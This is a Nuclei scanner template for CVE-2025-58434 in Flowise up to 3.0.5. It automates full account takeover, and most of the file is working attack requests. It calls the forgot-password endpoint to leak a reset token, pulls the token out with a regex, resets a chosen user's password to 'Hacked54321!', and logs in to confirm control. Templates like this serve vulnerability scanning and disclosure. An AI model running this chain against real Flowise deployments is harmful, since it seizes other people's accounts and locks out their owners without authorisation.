id: CVE-2025-58434

info:
  name: Flowise <= 3.0.5 - Full Account Takeover and Login Verification
  author: nukunga[seunghyeonJeon]
  severity: critical
  description: |
    Automates the full attack chain for CVE-2025-58434 in Flowise. 1) Leaks password reset token via forgot-password. 2) Resets the user's password to a known value. 3) Logs in with the new password to verify a complete account takeover.
  reference:
    - https://github.com/advisories/GHSA-wgpv-6j63-x5ph
    - https://nvd.nist.gov/vuln/detail/CVE-2025-58434
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-58434
    cwe-id: CWE-306
  tags: cve,cve2025,flowise,ato,rce,unauth,flowiseai

variables:
  username: "{{username}}"
  new_password: "Hacked54321!"

http:
  - raw:
      - |
        POST /api/v1/account/forgot-password HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"user":{"email":"{{username}}"}}

    extractors:
      - type: regex
        name: token
        part: body
        internal: true
        group: 1
        regex:
          - '"tempToken":"([A-Za-z0-9]{64})"'

  - raw:
      - |
        POST /api/v1/account/reset-password HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "user": {
            "email": "{{username}}",
            "tempToken": "{{token}}",
            "password": "{{new_password}}"
          }
        }

  - raw:
      - |
        POST /api/v1/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "email": "{{username}}",
          "password": "{{new_password}}"
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '"id":'
          - '"email":"{{username}}"'
          - '"activeWorkspaceId":'
        condition: and